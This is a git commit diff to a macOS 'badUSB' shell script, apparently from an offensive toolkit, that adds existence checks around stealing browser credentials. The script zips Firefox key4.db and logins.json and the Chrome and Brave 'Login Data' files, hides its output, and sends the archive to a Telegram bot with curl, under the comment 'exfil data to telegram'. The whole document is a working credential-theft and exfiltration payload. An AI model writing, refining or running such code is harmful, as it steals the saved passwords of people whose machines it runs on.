d16889e0a75b2be9fd779a15dacb01986521be00
Joie <JLlantero@Gmail.com>
2024-06-29 20:38:11 +0800

    handle missing files

--- macos/badUSB/browserdata/browserdata.sh
+++ macos/badUSB/browserdata/browserdata.sh
@@ -2,17 +2,30 @@
 
 cd ~/.hidden/
 
-# firefox
-zip -u firefox.zip ~/Library/Application\ Support/Firefox/Profiles/*.default-release/key4.db ~/Library/Application\ Support/Firefox/Profiles/*.default-release/logins.json 
+# function to expand ~ to the home directory
+expand_path() {
+    local path=$1
+    echo "$(eval echo "$path")"
+}
 
-# google chrome
-zip -u chrome.zip ~/Library/Application\ Support/Google/Chrome/Profile*/Login\ Data 
+# array of file paths to check and zip
+files_to_check=("~/Library/Application\ Support/Firefox/Profiles/*.default-release/key4.db" "~/Library/Application\ Support/Firefox/Profiles/*.default-release/logins.json" "~/Library/Application\ Support/Google/Chrome/Profile*/Login\ Data" "~/Library/Application\ Support/BraveSoftware/Brave-Browser/Default/Login\ Data")
 
-# brave browser
-zip -u brave.zip ~/Library/Application\ Support/BraveSoftware/Brave-Browser/Default/Login\ Data 
+# array to hold existing files
+existing_files=()
 
-# combine files into one
-zip -u data.zip firefox.zip chrome.zip brave.zip 
+# check if each file exists and add it to the array if it does
+for file in "${files_to_check[@]}"; do
+    expanded_file=$(expand_path "$file")
+    if [ -f "$expanded_file" ]; then
+        existing_files+=("$expanded_file")
+    fi
+done
+
+# zip the files if the array is not empty
+if [ ${#existing_files[@]} -gt 0 ]; then
+    zip -u data.zip "${existing_files[@]}" &>/dev/null
+fi
 
 # exfil data to telegram
 curl -F "chat_id=<your_chat_id>" -F document=@data.zip https://api.telegram.org/bot<your_bot_id>/sendDocument
